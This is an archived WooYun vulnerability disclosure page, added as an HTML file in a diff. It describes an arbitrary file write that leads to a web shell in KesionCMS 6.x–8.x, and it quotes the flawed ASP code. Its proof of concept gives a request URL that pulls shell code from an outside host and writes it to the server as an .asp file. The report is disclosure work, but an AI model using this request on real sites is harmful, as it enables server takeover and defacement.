@@ -1,0 +1,218 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		科讯 6.x~8.x getshell 0day  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		科讯 6.x~8.x getshell 0day  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/My5t3ry">My5t3ry</a> 
+</li><li>提交时间：		2013-02-21 17:49</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-02-21：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-04-07：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">未对提交参数判断，导致可以写任意文件到服务器上...</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">Wap/Plus/PhotoVote.asp 14 - 23<br />
+<br />
+<br />
+<br />
+</p><pre><code>Dim KS:Set KS=New PublicCls<br />
+Dim ID:ID = Replace(KS.S(&quot;ID&quot;),&quot; &quot;,&quot;&quot;)<br />
+Dim ChannelID:ChannelID=KS.G(&quot;ChannelID&quot;)<br />
+If ChannelID=&quot;&quot; Then ChannelID=2<br />
+If KS.G(&quot;LocalFileName&quot;)&lt;&gt;&quot;&quot; And KS.G(&quot;RemoteFileUrl&quot;)&lt;&gt;&quot;&quot; Then<br />
+   If KS.SaveBeyondFile(KS.G(&quot;LocalFileName&quot;),KS.G(&quot;RemoteFileUrl&quot;))= True Then<br />
+      Response.write KS.G(&quot;LocalFileName&quot;)&#039;错误提示<br />
+   End If<br />
+End If<br />
+<br />
+代码略……<br />
+<br />
+<br />
+	&#039;==================================================<br />
+	&#039;过程名：SaveBeyondFile<br />
+	&#039;作  用：保存远程的文件到本地<br />
+	&#039;参  数：LocalFileName ------ 本地文件名<br />
+	&#039;参  数：RemoteFileUrl ------ 远程文件URL<br />
+	&#039;==================================================<br />
+	Function SaveBeyondFile(LocalFileName,RemoteFileUrl)<br />
+	    On Error Resume Next<br />
+		SaveBeyondFile=True<br />
+		dim Ads,Retrieval,GetRemoteData<br />
+		Set Retrieval = Server.CreateObject(&quot;Microsoft.XMLHTTP&quot;)<br />
+		With Retrieval<br />
+			.Open &quot;Get&quot;, RemoteFileUrl, False, &quot;&quot;, &quot;&quot;<br />
+			.Send<br />
+			If .Readystate&lt;&gt;4 then<br />
+				SaveBeyondFile=False<br />
+				Exit Function<br />
+			End If<br />
+			GetRemoteData = .ResponseBody<br />
+		End With<br />
+		Set Retrieval = Nothing<br />
+		Set Ads = Server.CreateObject(&quot;Adodb.Stream&quot;)<br />
+		With Ads<br />
+			.Type = 1<br />
+			.Open<br />
+			.Write GetRemoteData<br />
+			.SaveToFile server.MapPath(LocalFileName),2<br />
+			.Cancel()<br />
+			.Close()<br />
+		End With<br />
+		If Err.Number&lt;&gt;0 Then<br />
+		   Err.Clear<br />
+		   SaveBeyondFile=False<br />
+		   Exit Function<br />
+		End If<br />
+		Set Ads=nothing<br />
+	End Function</code></pre><p class='detail'><br />
+<br />
+上面的代码中这几句：<br />
+<br />
+If KS.G(&quot;LocalFileName&quot;)&lt;&gt;&quot;&quot; And KS.G(&quot;RemoteFileUrl&quot;)&lt;&gt;&quot;&quot; Then<br />
+<br />
+   If KS.SaveBeyondFile(KS.G(&quot;LocalFileName&quot;),KS.G(&quot;RemoteFileUrl&quot;))= True Then<br />
+<br />
+      Response.write KS.G(&quot;LocalFileName&quot;)&#039;错误提示<br />
+<br />
+   End If<br />
+<br />
+End If<br />
+<br />
+KS.G(&quot;LocalFileName&quot;)和KS.G(&quot;RemoteFileUrl&quot;)仅仅是判断是否为空并过滤一些SQL字符然后就写文件了！ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">登陆后访问:<br />
+<br />
+http://www.t00ls.net/Wap/Plus/PhotoVote.asp?LocalFileName=cc.asp&amp;RemoteFileUrl=http://www.bksec.net/1.txt<br />
+<br />
+成功会在Wap/Plus下写入cc.asp,并返回文件名，其中的1.txt为shell代码。。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">判断&amp;过滤,你懂懂 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/My5t3ry" title="My5t3ry">My5t3ry</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-019000" title="科讯 6.x~8.x getshell 0day">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="19000";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
